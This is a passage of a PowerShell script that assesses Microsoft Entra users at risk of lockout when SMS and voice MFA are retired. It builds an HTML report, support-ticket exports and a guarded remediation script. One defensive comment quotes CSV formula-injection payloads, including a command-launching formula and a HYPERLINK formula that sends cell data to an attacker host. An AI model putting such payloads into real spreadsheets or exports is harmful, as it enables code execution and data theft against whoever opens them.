<dt>SMS method state</dt><dd>$(ConvertTo-SafeHtml $Summary.SmsPolicyState)</dd>
<dt>SMS include targets</dt><dd>$(ConvertTo-SafeHtml $(if ($Summary.SmsPolicyInclude) { $Summary.SmsPolicyInclude } else { 'none' }))</dd>
<dt>SMS exclude targets</dt><dd>$(ConvertTo-SafeHtml $(if ($Summary.SmsPolicyExclude) { $Summary.SmsPolicyExclude } else { 'none' }))</dd>
<dt>Voice method state</dt><dd>$(ConvertTo-SafeHtml $Summary.VoicePolicyState)</dd>
<dt>Voice include targets</dt><dd>$(ConvertTo-SafeHtml $(if ($Summary.VoicePolicyInclude) { $Summary.VoicePolicyInclude } else { 'none' }))</dd>
<dt>Voice exclude targets</dt><dd>$(ConvertTo-SafeHtml $(if ($Summary.VoicePolicyExclude) { $Summary.VoicePolicyExclude } else { 'none' }))</dd>
<dt>Users in SMS scope</dt><dd>$(ConvertTo-SafeHtml $Summary.InSmsPolicyScope)</dd>
<dt>Users in voice scope</dt><dd>$(ConvertTo-SafeHtml $Summary.InVoicePolicyScope)</dd>
<dt>Oldest report row</dt><dd>$(ConvertTo-SafeHtml $Summary.OldestReportRowUtc) &mdash; the registration report lags live directory state, so this is the age of the evidence</dd>
<dt>Users missing from report</dt><dd>$(ConvertTo-SafeHtml $Summary.UsersMissingFromReport)</dd>
</dl>

<h2>Actionable findings ($($actionable.Count))</h2>
<div class="tablewrap">
$findingsHtml
</div>

<h2>Read this before acting</h2>
<div class="note">
<ul>
<li><strong>Critical rows are individual work.</strong> Privileged accounts that cannot satisfy MFA after retirement. Register a FIDO2 key or platform passkey and verify with a real test sign-in. Check emergency-access accounts specifically; they are the ones most likely to have a phone number attached that nobody has looked at in a year.</li>
<li><strong>Register the new method before removing the phone method.</strong> Doing it in the other order creates the lockout you are working to prevent.</li>
<li><strong>A large Moderate count means legacy per-user MFA.</strong> Those users have a phone method registered but do not resolve into modern AMP scope. They are still in scope for the retirement. This assessment cannot read legacy per-user MFA service settings; validate that population manually.</li>
<li><strong>Policy scope is not effective sign-in behaviour.</strong> Conditional Access is not evaluated here. A user in AMP scope may never be challenged, and a user outside it may still be blocked by a grant control this assessment does not read.</li>
<li><strong>Guests follow a separate Microsoft timeline</strong> for passkey support. Validate B2B readiness independently before assuming a guest can register on the same schedule as a member.</li>
</ul>
</div>

<h2>Scope and method</h2>
<div class="method">
<div>
<h4>What was assessed</h4>
<ul>
<li>Every enabled user object returned by Graph, members and guests, with full pagination.</li>
<li>SMS and voice authentication methods policy include and exclude targets, resolved to users through nested group membership.</li>
<li>The authentication methods registration report, per user.</li>
<li>Registration campaign state, which Microsoft sets to Microsoft managed for in-scope tenants on 1 September 2026.</li>
</ul>
</div>
<div>
<h4>What was not</h4>
<ul>
<li>Disabled users. The registration report does not return them.</li>
<li>Legacy per-user MFA service settings. Reading them requires beta endpoints and broader permissions than this assessment holds.</li>
<li>Conditional Access. Policy scope is not the same as being challenged at sign-in.</li>
<li>Non-human accounts. Shared mailboxes and service accounts appear as ordinary users and should be reviewed before they become tickets.</li>
</ul>
</div>
</div>

<footer>
Generated by Get-EntraSmsVoiceMigrationImpact.ps1. Read-only assessment; every Microsoft Graph call was a GET and no tenant setting was modified.<br>
This report contains identity-security metadata including administrative status and registered authentication methods. Handle and retain it with the same controls you apply to a penetration test report.<br>
Timeline dates are per Microsoft Learn: passkeys by default and retirement of Microsoft-provided SMS and voice authentication. Customer-managed telecom providers can be configured from $($providerDate.ToString('d MMMM yyyy')).
</footer>

</main>
</body>
</html>
"@

    $html | Out-File -LiteralPath $Path -Encoding utf8 -Force
    if (-not $SkipAclHardening) { Protect-OutputFile -Path $Path }
    return $Path
}

function New-ActionList {
    # Two jobs, one file. It is the membership list for the migration security group
    # Microsoft's guidance tells you to create in step one, and it is the action list you
    # attach to a ticket you raised yourself. Both want the same population; the second
    # also wants to know what to do, which is why PhoneMethodsRegistered and NextStep are
    # here and the diagnostic columns are not.
    #
    # A function rather than inline export code so the published sample in examples/ can be
    # generated by the same path a real run takes, instead of by something that resembles it.
    param([Parameter(Mandatory)][AllowEmptyCollection()][object[]]$Rows)

    $order = @{ Critical = 0; High = 1; Moderate = 2; Low = 3; Informational = 4; Excluded = 5 }

    # Same read order as the main CSV: worst first, admins ahead of standard users. This
    # file is worked top-down by whoever opens the ticket, so directory order is useless.
    # Blocked users first inside a band: they are the ones who stop working, and a Moderate
    # user with only a phone is stopped while a High user holding Authenticator is not.
    return @($Rows |
        Where-Object { $_.Risk -in @('Critical', 'High', 'Moderate') } |
        Sort-Object `
            @{ Expression = { $order[[string]$_.Risk] }; Ascending = $true }, `
            @{ Expression = { Test-RowFlag (Get-PropertyValue $_ 'BlockedAtRetirement') }; Descending = $true }, `
            @{ Expression = { Test-RowFlag (Get-PropertyValue $_ 'IsAdmin') }; Descending = $true }, `
            # Recently active first. An account nobody has signed into for a year is a
            # deprovisioning ticket, and it should not sit above a person at the top of
            # somebody's queue. Non-numeric markers sort last, which is where they belong.
            @{ Expression = { Get-SignInAgeSortKey (Get-PropertyValue $_ 'DaysSinceLastSignIn') }; Ascending = $true }, `
            @{ Expression = { [string]$_.DisplayName }; Ascending = $true } |
        Select-Object Risk, BlockedAtRetirement, DaysSinceLastSignIn, DisplayName,
            UserPrincipalName, IsAdmin, PhoneMethodsRegistered, IsPasswordlessCapable,
            NextStep, UserId)
}

function Get-TicketNextStep {
    # The row already carries NextStep. Recomputing is the fallback for rows handed in
    # from an export that predates the column, so the ticket queue never silently loses
    # its opening instruction.
    param([Parameter(Mandatory)]$Row)

    $existing = Get-PropertyValue $Row 'NextStep'
    if (-not [string]::IsNullOrWhiteSpace($existing)) { return [string]$existing }

    return Get-RemediationStep -Risk ([string]$Row.Risk) `
        -HasPhoneMethodRegistered ([bool]$Row.PhoneMethodsRegistered) `
        -UserType ([string]$Row.UserType) `
        -PhoneMethodsRegistered ([string]$Row.PhoneMethodsRegistered)
}

function Get-TicketHistory {
    # Users an earlier run already raised a ticket for, as a map of user id to the risk
    # band they were at when it was raised.
    #
    # Without this, a second run regenerates the whole queue and imports a duplicate ticket
    # for everyone who has not remediated yet. On a monthly cadence that is how a PSA queue
    # fills with copies of work already in progress and stops being trusted.
    [CmdletBinding()]
    param([string]$Path)

    $empty = @{}
    if ([string]::IsNullOrWhiteSpace($Path) -or -not (Test-Path -LiteralPath $Path)) { return $empty }

    try {
        $raw = Get-Content -LiteralPath $Path -Raw
        if ([string]::IsNullOrWhiteSpace($raw)) { return $empty }

        $parsed = $raw | ConvertFrom-Json -AsHashtable
        $entries = if ($parsed -is [hashtable] -and $parsed.ContainsKey('Ticketed')) { $parsed['Ticketed'] } else { $parsed }
        if ($entries -isnot [hashtable]) { return $empty }

        $history = @{}
        foreach ($key in $entries.Keys) { $history[[string]$key] = [string]$entries[$key] }
        return $history
    }
    catch {
        # A corrupt history must not stop the assessment. Warn and behave as a first run,
        # which duplicates tickets rather than dropping them; the safe direction.
        Write-Warning "Could not read ticket history at $Path, treating this as a first run. $($_.Exception.Message)"
        return $empty
    }
}

function Save-TicketHistory {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][hashtable]$History,

        # Taken as a parameter rather than read out of the caller's scope. These file-writing
        # helpers are lifted into tests and into examples/New-ExampleOutput.ps1, where an
        # ambient read is a variable nobody can see being consulted -- and static analysis
        # flags it as dead in the caller, which is how it reached CI twice.
        [switch]$SkipAclHardening
    )

    $directory = Split-Path -Parent $Path
    if ($directory -and -not (Test-Path -LiteralPath $directory)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }

    # Object ids and risk bands only. No names, no UPNs: this file sits wherever the
    # operator points it and does not need to carry identifying data to do its job.
    [PSCustomObject]@{
        Schema      = 1
        UpdatedUtc  = (Get-Date).ToUniversalTime().ToString('o')
        Ticketed    = $History
    } | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath $Path -Encoding utf8

    if (-not $SkipAclHardening) { Protect-OutputFile -Path $Path }
}

function Test-NeedsTicket {
    # A user needs a ticket if they have never had one, or if they have got worse since
    # the one they had. Somebody who was High last month and is High today is already in
    # somebody's queue; raising it again does not add information.
    param(
        # Empty is allowed and means "ticket them": a row with no object id cannot be
        # matched against history, and dropping it silently is the wrong failure.
        [Parameter(Mandatory)][AllowEmptyString()][string]$UserId,
        [Parameter(Mandatory)][string]$CurrentRisk,
        [Parameter(Mandatory)][AllowEmptyCollection()][hashtable]$History
    )

    if ([string]::IsNullOrWhiteSpace($UserId)) { return $true }
    if (-not $History.ContainsKey($UserId)) { return $true }

    $order = @{ Critical = 0; High = 1; Moderate = 2; Low = 3; Informational = 4; Excluded = 5 }
    $previous = $order[[string]$History[$UserId]]
    $current = $order[$CurrentRisk]

    # An unrecognised band on either side falls back to raising the ticket.
    if ($null -eq $previous -or $null -eq $current) { return $true }

    return ($current -lt $previous)
}

function New-TicketExport {
    # Generic PSA-shaped columns. ConnectWise, Autotask, Halo, and Freshservice all import
    # from a flat CSV; the column names differ per platform, so map them at import time
    # rather than baking one vendor's schema in here.
    param(
        [Parameter(Mandatory)][AllowEmptyCollection()][object[]]$Rows,
        [Parameter(Mandatory)][string]$Path,
        [string]$Customer,
        [int]$MaxIndividual = 50,

        # User ids already ticketed by an earlier run, mapped to the risk band they were at
        # when the ticket was raised. Empty for a first run.
        [AllowEmptyCollection()][hashtable]$History = @{},

        # Forwarded to Export-AssessmentCsv, which writes the ticket file.
        [switch]$SkipAclHardening
    )

    $today = Get-Date
    $autoEnable = [datetime]'2026-09-01'
    $retirement = [datetime]'2027-02-01'

    # Work to the next deadline that has not passed. Before September the pressure is the
    # nudge and the chance to avoid it; after it, the pressure is the hard cutoff.
    $primaryDeadline = if ($today -lt $autoEnable) { $autoEnable } else { $retirement }
    $company = if ($Customer) { $Customer } else { 'Unassigned' }

    # Everyone in an actionable band, before history is applied. Used to report how many
    # were suppressed, so a near-empty queue reads as "already ticketed" rather than
    # "assessment found nothing".
    $allActionable = @($Rows | Where-Object { $_.Risk -in @('Critical', 'High', 'Moderate') })

    # A user is ticketed once. They come back only if they got worse, because somebody who
    # was High last month and is High today is already in a queue and a second ticket adds
    # no information, just noise the technician has to close.
    $needsTicket = {
        param($row)
        Test-NeedsTicket -UserId ([string]$row.UserId) -CurrentRisk ([string]$row.Risk) -History $History
    }

    $criticalRows = @($Rows | Where-Object Risk -eq 'Critical' | Where-Object { & $needsTicket $_ } | Sort-Object DisplayName)
    $highRows = @($Rows | Where-Object Risk -eq 'High' | Where-Object { & $needsTicket $_ } |
        Sort-Object -Property @{ Expression = 'IsAdmin'; Descending = $true }, DisplayName)
    $moderateRows = @($Rows | Where-Object Risk -eq 'Moderate' | Where-Object { & $needsTicket $_ } | Sort-Object DisplayName)

    $suppressed = $allActionable.Count - ($criticalRows.Count + $highRows.Count + $moderateRows.Count)

    $tickets = [System.Collections.Generic.List[object]]::new()

    function New-Ticket {
        param($Priority, $Summary, $Description, $DueDate, $Category, $ContactName = '', $ContactEmail = '', $UserId = '', $Risk = '')
        return [PSCustomObject][ordered]@{
            Priority     = $Priority
            Summary      = $Summary
            Company      = $company
            ContactName  = $ContactName
            ContactEmail = $ContactEmail
            UserId       = $UserId
            Risk         = $Risk
            Category     = $Category
            DueDate      = $DueDate.ToString('yyyy-MM-dd')
            Status       = 'New'
            Source       = 'Entra SMS/Voice migration assessment'
            Description  = $Description
        }
    }

    # Critical: privileged accounts, individually, always. These are never batched.
    foreach ($row in $criticalRows) {
        $methods = if ($row.PhoneMethodsRegistered) { $row.PhoneMethodsRegistered } else { 'none reported' }
        $body = @"
PRIVILEGED ACCOUNT AT RISK OF SIGN-IN LOCKOUT

User: $($row.DisplayName) <$($row.UserPrincipalName)>
Object ID: $($row.UserId)
Registered phone methods: $methods
All registered methods: $($row.AllMethodsRegistered)
Passwordless capable: No

Why this ticket exists
This account holds a privileged role, is targeted by the Entra SMS/voice authentication
methods policy, and has no phishing-resistant method registered. When Microsoft-provided
SMS and voice delivery is retired on 2027-02-01 this account cannot satisfy MFA and will
be blocked at sign-in with no opt-out.

Next step
$(Get-TicketNextStep -Row $row)

Actions
1. Contact the user and schedule a short session; do not rely on a self-service nudge for
   a privileged account.
2. Register a FIDO2 security key or platform passkey (Windows Hello, iOS, Android).
3. Verify with an actual test sign-in. Registration alone is not confirmation.
4. Confirm the account recovery path does not also depend on a phone number.
5. If this is an emergency-access or break-glass account, confirm the documented exclusion
   strategy still holds and that at least one break-glass account uses a method outside the
   retirement scope.
6. Leave the phone method registered until the passkey is verified working, then remove it.

Do not remove the phone method first. That creates the lockout you are trying to prevent.
"@
        $tickets.Add((New-Ticket -Priority 'P1 - Critical' `
            -Summary "Passkey migration (privileged): $($row.DisplayName)" `
            -Description $body -DueDate $primaryDeadline -Category 'Identity / MFA migration' `
            -ContactName $row.DisplayName -ContactEmail $row.UserPrincipalName `
            -UserId $row.UserId -Risk 'Critical'))
    }

    # High: individual up to the cap, then batched. The cap exists so a tenant with
    # "All users" targeting does not generate a ticket per employee.
    $individualHigh = @($highRows | Select-Object -First ([math]::Max(0, $MaxIndividual - $criticalRows.Count)))
    $batchedHigh = @($highRows | Select-Object -Skip $individualHigh.Count)

    foreach ($row in $individualHigh) {
        $methods = if ($row.PhoneMethodsRegistered) { $row.PhoneMethodsRegistered } else { 'none reported' }
        $guestNote = if ($row.UserType -eq 'Guest') { "`n`nGuest account. Passkey support for B2B and internal guest users follows a separate Microsoft timeline. Confirm the user can register before promising a date." } else { '' }
        $body = @"
USER AT RISK OF SIGN-IN LOCKOUT

User: $($row.DisplayName) <$($row.UserPrincipalName)>
Object ID: $($row.UserId)
User type: $($row.UserType)
Registered phone methods: $methods
All registered methods: $($row.AllMethodsRegistered)
Passwordless capable: No

Why this ticket exists
$($row.Reason)

Next step
$(Get-TicketNextStep -Row $row)

Actions
1. Direct the user to register a passkey or Microsoft Authenticator, with guidance for their
   device type.
2. Confirm registration completed. The registration report lags, so verify in the portal or
   re-run the assessment rather than assuming.
3. Leave the existing phone method in place until the new method is confirmed working.$guestNote
"@
        $tickets.Add((New-Ticket -Priority 'P2 - High' `
            -Summary "Passkey migration: $($row.DisplayName)" `
            -Description $body -DueDate $primaryDeadline -Category 'Identity / MFA migration' `
            -ContactName $row.DisplayName -ContactEmail $row.UserPrincipalName `
            -UserId $row.UserId -Risk 'High'))
    }

    if ($batchedHigh.Count -gt 0) {
        $sample = ($batchedHigh | Select-Object -First 10 | ForEach-Object { "  - $($_.DisplayName) <$($_.UserPrincipalName)>" }) -join "`n"
        $body = @"
BULK PASSKEY MIGRATION CAMPAIGN

Affected users: $($batchedHigh.Count)
Full list: see the remediation group CSV produced alongside this export.

Why this ticket exists
These users are targeted by the SMS/voice authentication methods policy and have no
phishing-resistant method registered. Individually ticketing them is not practical at this
volume; run a scoped campaign instead.

Actions
1. Create a security group containing this population. The remediation group CSV is the
   membership list, ready for bulk import.
2. Send the awareness communication BEFORE any nudge fires. A prompt that arrives without
   warning generates help desk volume.
3. Run a registration campaign scoped to that group rather than waiting for the
   Microsoft-managed default to fire on 2026-09-01.
4. Re-run the assessment on a cadence to track completion. The registration report lags,
   so do not expect an immediate drop after the campaign starts.
5. Once the population is migrated, remove SMS and voice from the authentication methods
   policy scope.

First 10 users (full list in the remediation group CSV):
$sample
"@
        $tickets.Add((New-Ticket -Priority 'P2 - High' `
            -Summary "Passkey migration campaign: $($batchedHigh.Count) users" `
            -Description $body -DueDate $primaryDeadline -Category 'Identity / MFA migration' `
            -Risk 'High'))
    }

    # Moderate is a single investigation ticket, not per-user work. The finding is about
    # the tenant configuration, not about any individual in the list.
    if ($moderateRows.Count -gt 0) {
        $sample = ($moderateRows | Select-Object -First 10 | ForEach-Object { "  - $($_.DisplayName) <$($_.UserPrincipalName)> [$($_.PhoneMethodsRegistered)]" }) -join "`n"
        $body = @"
VALIDATE LEGACY PER-USER MFA EXPOSURE

Affected users: $($moderateRows.Count)

Why this ticket exists
These users have a phone-based authentication method registered but did not resolve into
the modern authentication methods policy scope for SMS or voice. That usually means one of:

  - They are enabled for SMS or voice through legacy per-user MFA service settings, which
    ARE in scope for the retirement and which this assessment cannot read.
  - Phone numbers were registered under legacy policy and never cleaned up.
  - The registration report is stale relative to a recent policy change.

The first case is the one that matters. Those users are exposed to the 2027-02-01 cutoff
and will not appear in any assessment that only reads the modern policy.

Actions
1. Check legacy per-user MFA service settings for this population.
2. If users are enabled for SMS or voice there, convert them to the modern authentication
   methods policy so the exposure becomes measurable.
3. Fold any confirmed exposure into the main migration campaign.
4. For users who are simply carrying a stale phone registration, remove it once a
   phishing-resistant method is confirmed. This reduces account-recovery attack surface
   independently of the retirement.

First 10 users:
$sample
"@
        $tickets.Add((New-Ticket -Priority 'P3 - Moderate' `
            -Summary "Validate legacy per-user MFA exposure: $($moderateRows.Count) users" `
            -Description $body -DueDate $retirement -Category 'Identity / configuration review' `
            -Risk 'Moderate'))
    }

    Export-AssessmentCsv -Data $tickets.ToArray() -Path $Path -SkipAclHardening:$SkipAclHardening

    # History carries forward everything it already held plus everyone ticketed this run,
    # so a user who remediates and later regresses is still recognised as previously seen.
    $updatedHistory = @{}
    foreach ($key in $History.Keys) { $updatedHistory[[string]$key] = [string]$History[$key] }
    foreach ($row in @($criticalRows) + @($highRows) + @($moderateRows)) {
        $id = [string]$row.UserId
        if (-not [string]::IsNullOrWhiteSpace($id)) { $updatedHistory[$id] = [string]$row.Risk }
    }

    return [PSCustomObject]@{
        Path       = $Path
        Count      = $tickets.Count
        Suppressed = $suppressed
        History    = $updatedHistory
    }
}

function New-RemediationScript {
    <#
    .SYNOPSIS
        Writes a PowerShell script of remediation commands for a human to review and run.
    .DESCRIPTION
        This assessment does not write to a tenant, and this function does not change that:
        it produces a file. Nothing in it executes here, and the file it writes does nothing
        until somebody opens it, reads it, and runs it themselves.

        That boundary is deliberate rather than timid. The central remediation cannot be
        automated at all -- there is no Graph call that registers a passkey for somebody,
        because registration requires the user present with their device. What can be
        automated is the supporting cast, and the order it goes in is the whole point:

            1. Issue a Temporary Access Pass, so the user can register a passkey WITHOUT
               the phone they are about to lose. Skipping this is what strands people.
            2. The user registers. A human step, and the script says so and stops.
            3. Verify the new method exists.
            4. Only then remove the phone method.

        Every generated block is commented in that order, with the removal commented out.
        Removing a phone method before a replacement is confirmed working is precisely the
        lockout this entire tool exists to prevent, so the one destructive line in the file
        is the one line that will not run until a person deletes a comment marker.
    #>
    param(
        [Parameter(Mandatory)][AllowEmptyCollection()][object[]]$Rows,
        [Parameter(Mandatory)][string]$Path,
        [string]$Customer,
        [Parameter(Mandatory)][string]$GeneratedFrom,

        # Taken as a parameter rather than read out of the caller's scope. Reaching into
        # ambient state works until something calls this from somewhere else -- a test, the
        # sample generator -- and then it is a variable nobody can see being read.
        [switch]$SkipAclHardening
    )

    $targets = @($Rows | Where-Object { $_.Risk -in @('Critical', 'High', 'Moderate') })

    $label = if ([string]::IsNullOrWhiteSpace($Customer)) { 'this tenant' } else { $Customer }
    $lines = [System.Collections.Generic.List[string]]::new()

    [void]$lines.Add('<#')
    [void]$lines.Add("    Remediation commands for $label, generated from:")
    [void]$lines.Add("      $GeneratedFrom")
    [void]$lines.Add('')
    [void]$lines.Add('    THIS FILE HAS NOT BEEN RUN. It was written by a read-only assessment that does')
    [void]$lines.Add('    not modify tenants. Read it before you run any of it.')
    [void]$lines.Add('')
    [void]$lines.Add('    The order below matters more than the commands do. A passkey cannot be')
    [void]$lines.Add('    registered for somebody by any API -- the user has to be present -- so each')
    [void]$lines.Add('    block issues a Temporary Access Pass first, which is what lets them register')
    [void]$lines.Add('    without the phone they are about to lose. The line that removes the phone is')
    [void]$lines.Add('    commented out on purpose: removing it before a replacement is confirmed is the')
    [void]$lines.Add('    exact lockout the assessment exists to prevent.')
    [void]$lines.Add('')
    [void]$lines.Add('    Permissions these need are WRITE permissions, well beyond the read-only set')
    [void]$lines.Add('    the assessment used:')
    [void]$lines.Add('      UserAuthenticationMethod.ReadWrite.All   TAP issuance, phone removal')
    [void]$lines.Add('      Policy.ReadWrite.AuthenticationMethod    per-user MFA state')
    [void]$lines.Add('#>')
    [void]$lines.Add('')
    [void]$lines.Add('#Requires -Version 7.0')
    [void]$lines.Add('#Requires -Modules Microsoft.Graph.Authentication')
    [void]$lines.Add('')
    [void]$lines.Add('Set-StrictMode -Version Latest')
    [void]$lines.Add("$" + "ErrorActionPreference = 'Stop'")
    [void]$lines.Add('')
    [void]$lines.Add('throw ''Read this script, delete this throw, then run the blocks you want. It will not run as generated.''')
    [void]$lines.Add('')
    [void]$lines.Add('# Connect-MgGraph -Scopes UserAuthenticationMethod.ReadWrite.All, Policy.ReadWrite.AuthenticationMethod')
    [void]$lines.Add('')

    if ($targets.Count -eq 0) {
        [void]$lines.Add('# No user in an actionable band. Nothing to remediate.')
    }

    foreach ($row in $targets) {
        $upn = [string](Get-PropertyValue $row 'UserPrincipalName')
        $id = [string](Get-PropertyValue $row 'UserId')
        # Via Get-PropertyValue, not direct access: under StrictMode a property the row
        # shape does not carry throws, and this function is reachable with either the full
        # assessment row or the narrower action-list row. That mistake has crashed this
        # script three times now.
        $age = [string](Get-PropertyValue $row 'DaysSinceLastSignIn')
        $legacyState = [string](Get-PropertyValue $row 'PerUserMfaState')

        [void]$lines.Add('# ---------------------------------------------------------------------------')
        [void]$lines.Add("# $([string](Get-PropertyValue $row 'DisplayName'))  <$upn>")
        [void]$lines.Add("#   Risk $([string](Get-PropertyValue $row 'Risk')); blocked at retirement: $([string](Get-PropertyValue $row 'BlockedAtRetirement')); last sign-in: $age")
        [void]$lines.Add("#   Phone methods: $([string](Get-PropertyValue $row 'PhoneMethodsRegistered'))")

        # A stale account is a different ticket, and saying so here saves somebody
        # scheduling a call with a person who left.
        if ($age -eq $script:SignInAgeNever -or ($age -as [int]) -ge $script:StaleSignInDays) {
            [void]$lines.Add('#   STALE. Confirm this account still belongs to somebody before doing any of this.')
            [void]$lines.Add('#   A dormant account is a deprovisioning ticket, not a passkey one.')
        }

        if ($legacyState -in @('enabled', 'enforced')) {
            [void]$lines.Add("#   In legacy per-user MFA ($legacyState). Convert first, or the")
            [void]$lines.Add('#   registration campaign will never reach them.')
            [void]$lines.Add("# Invoke-MgGraphRequest -Method PATCH -Uri 'https://graph.microsoft.com/beta/users/$id/authentication/requirements' -Body @{ perUserMfaState = 'disabled' }")
        }

        [void]$lines.Add('# 1. Temporary Access Pass, so they can register without the phone.')
        [void]$lines.Add("# Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/users/$id/authentication/temporaryAccessPassMethods' -Body @{ isUsableOnce = `$false; lifetimeInMinutes = 480 }")
        [void]$lines.Add('# 2. The user registers a passkey at https://aka.ms/mysecurityinfo. Human step.')
        [void]$lines.Add('# 3. Confirm the new method exists before touching the old one.')
        [void]$lines.Add("# Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/v1.0/users/$id/authentication/methods'")
        [void]$lines.Add('# 4. LAST. Only after step 3 shows a surviving method.')
        [void]$lines.Add("#    List, then delete by the id it returns:")
        [void]$lines.Add("# Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/v1.0/users/$id/authentication/phoneMethods'")
        [void]$lines.Add("# Invoke-MgGraphRequest -Method DELETE -Uri 'https://graph.microsoft.com/v1.0/users/$id/authentication/phoneMethods/<id-from-above>'")
        [void]$lines.Add('')
    }

    $content = ($lines -join [Environment]::NewLine)
    $directory = Split-Path -Parent $Path
    if ($directory -and -not (Test-Path -LiteralPath $directory)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }
    Set-Content -LiteralPath $Path -Value $content -Encoding utf8
    if (-not $SkipAclHardening) { Protect-OutputFile -Path $Path }
    return (Resolve-Path -LiteralPath $Path).Path
}

function Protect-CsvInjection {
    # CSV/formula injection. A display name of "=cmd|'/c calc'!A1" or
    # "=HYPERLINK(""http://attacker/""&A1,""Click"")" executes when the report is opened in
    # Excel, exfiltrating the row it sits next to. Display names are attacker-influenceable
    # in tenants that allow self-service profile edits or B2B invites, and this report is
    # specifically a file that a manager will open in Excel. Prefixing the value with a
    # single quote makes Excel treat it as literal text.
    # Applied at export time only, so in-memory objects stay pristine for the HTML path,
    # which has its own encoding.
    param([Parameter(ValueFromPipeline)][object]$InputObject)

    process {
        $clone = [ordered]@{}
        foreach ($property in $InputObject.PSObject.Properties) {
            $value = $property.Value
            if ($value -is [string] -and $value.Length -gt 0 -and
                $value[0] -in @('=', '+', '-', '@', [char]9, [char]13)) {
                $value = "'" + $value
            }
            $clone[$property.Name] = $value
        }
        [PSCustomObject]$clone
    }
}

function Protect-OutputFile {
    # Every artefact this script writes is a targeting list: it names privileged accounts
    # and states which of them lack a phishing-resistant method. Files inherit the parent
    # directory ACL by default, which on a shared reports folder can mean everyone.
    # Restrict to the file owner and local Administrators.
    param([Parameter(Mandatory)][string]$Path)

    if (-not $IsWindows) { return }   # POSIX ACLs are out of scope; document instead

    try {
        $acl = Get-Acl -LiteralPath $Path
        $acl.SetAccessRuleProtection($true, $false)   # break inheritance, drop inherited rules
        foreach ($existing in @($acl.Access)) { [void]$acl.RemoveAccessRule($existing) }

        $identities = @(
            [System.Security.Principal.WindowsIdentity]::GetCurrent().User
            (New-Object System.Security.Principal.SecurityIdentifier 'S-1-5-32-544')  # BUILTIN\Administrators
        )
        foreach ($identity in $identities) {
            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                $identity, 'FullControl', 'Allow')))
        }
        Set-Acl -LiteralPath $Path -AclObject $acl
    }
    catch {
        # Network shares and some filesystems reject ACL changes. Warn rather than fail:
        # losing the report is worse than losing the hardening, but the operator must know.
        Write-Warning "Could not restrict permissions on $Path. Verify access controls manually. $($_.Exception.Message)"
    }
}

function Export-AssessmentCsv {
    # Single choke point for every CSV this script writes, so injection protection and
    # ACL hardening cannot be forgotten on a future export.
    param(
        [Parameter(Mandatory)][AllowEmptyCollection()][object[]]$Data,
        [Parameter(Mandatory)][string]$Path,

        # Taken as a parameter rather than read out of the caller's scope. These file-writing
        # helpers are lifted into tests and into examples/New-ExampleOutput.ps1, where an
        # ambient read is a variable nobody can see being consulted -- and static analysis
        # flags it as dead in the caller, which is how it reached CI twice.
        [switch]$SkipAclHardening
    )

    $Data | Protect-CsvInjection | Export-Csv -LiteralPath $Path -NoTypeInformation -Encoding utf8BOM
    if (-not $SkipAclHardening) { Protect-OutputFile -Path $Path }
}

# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------

Assert-GraphDependency

# One clock for the run. Calling Get-Date per row would measure a 300-user tenant's first
# and last rows against different instants, which is a silly way to get an off-by-one.
$assessmentStartUtc = (Get-Date).ToUniversalTime()

# Normalise before connecting, so a sign-in name becomes the tenant it belongs to rather
# than an error from Graph that names neither the problem nor the fix.
$TenantId = Resolve-TenantIdentifier -Value $TenantId

$graphContext = Connect-AssessmentGraph

Write-Host 'Reading enabled users (members and guests)...' -ForegroundColor Cyan

# signInActivity is asked for so a work queue can distinguish a person from an account a
# leaver process missed. Two constraints come with it, both from Microsoft's own docs:
# selecting it caps the page size at 500 rather than 999, and it needs Entra ID P1 or P2.
#
# A tenant without that licensing must still get an assessment, so the whole query falls
# back to the plain one rather than failing. Losing the staleness column is a smaller loss
# than losing the run, and every row then says so rather than reading as "signed in today".
$userSelect = 'id,displayName,userPrincipalName,userType,accountEnabled'
$signInActivityAvailable = $true
try {
    $users = Get-GraphCollection -Uri "$script:GraphBase/users?`$select=$userSelect,signInActivity&`$top=500"
}
catch {
    $signInActivityAvailable = $false
    Write-Warning "Sign-in activity could not be read, so account staleness is unavailable: $($_.Exception.Message)"
    Write-Warning 'This usually means the tenant lacks Entra ID P1/P2. The assessment continues; DaysSinceLastSignIn will read (not available).'
    $users = Get-GraphCollection -Uri "$script:GraphBase/users?`$select=$userSelect&`$top=999"
}
$enabledUsers = @($users | Where-Object { (Get-PropertyValue $_ 'accountEnabled') -eq $true })
if ($enabledUsers.Count -eq 0) { throw 'No enabled users were returned. Verify the signed-in account has User.Read.All.' }

# Everyone the filter removed, so the assessment's own arithmetic reconciles: directory
# total = assessed + skipped. Without it, a user dropped for any reason -- genuinely
# disabled, or accountEnabled not coming back readable -- leaves no trace, and there is no
# way to tell a correct total from one that quietly lost people.
#
# Not a warning, because disabled accounts are the ordinary case and documented. It is a
# number to sanity-check: if it does not roughly match the disabled accounts you expect,
# something is wrong with the read rather than with the tenant.
$usersSkippedNotEnabled = $users.Count - $enabledUsers.Count

$enabledUserIndex = @{}
foreach ($user in $enabledUsers) { $enabledUserIndex[[string](Get-PropertyValue $user 'id')] = $user }

Write-Host 'Reading registration campaign state...' -ForegroundColor Cyan
$campaignState = Get-RegistrationCampaignState

Write-Host 'Resolving SMS and voice policy scope (nested groups and exclusions)...' -ForegroundColor Cyan
$smsScope = Get-MethodPolicyScope -Method sms -EnabledUserIndex $enabledUserIndex
$voiceScope = Get-MethodPolicyScope -Method voice -EnabledUserIndex $enabledUserIndex

Write-Host 'Reading authentication-method registration report...' -ForegroundColor Cyan
# $top is held at 500 for the reports endpoint; it rejects larger page sizes on some tenants.
$registrations = Get-GraphCollection -Uri "$script:GraphBase/reports/authenticationMethods/userRegistrationDetails?`$top=500"
$registrationIndex = @{}
foreach ($registration in $registrations) { $registrationIndex[[string](Get-PropertyValue $registration 'id')] = $registration }

# Entra stores a phone number with a type rather than "SMS" or "voice" registrations.
# mobilePhone can satisfy both SMS and voice; officePhone is voice-only; smsSignIn is
# primary SMS sign-in. All four are retired with Microsoft-provided telecom delivery.
# The older enum spellings are here too. Microsoft's usageAuthMethod enum carries both
